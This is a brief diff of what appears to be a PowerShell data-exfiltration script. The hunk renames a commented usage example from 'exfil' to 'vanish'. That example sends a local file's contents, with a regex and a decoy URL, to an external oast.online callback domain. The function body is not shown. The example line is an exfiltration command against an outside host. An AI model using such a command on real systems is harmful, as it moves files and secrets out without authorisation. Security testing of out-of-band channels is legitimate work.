@@ -108,4 +108,4 @@ function vanish {
     }
 }
 
-# exfil -regex 'xregex' -domain 'clndh3qilvdv6403g1n0hs3rhd6xpfmjn.oast.online' -url 'example.com' -filepath .\AST-Test.txt
+# vanish -regex 'xregex' -domain 'clndh3qilvdv6403g1n0hs3rhd6xpfmjn.oast.online' -url 'example.com' -filepath .\DB-Test.txt
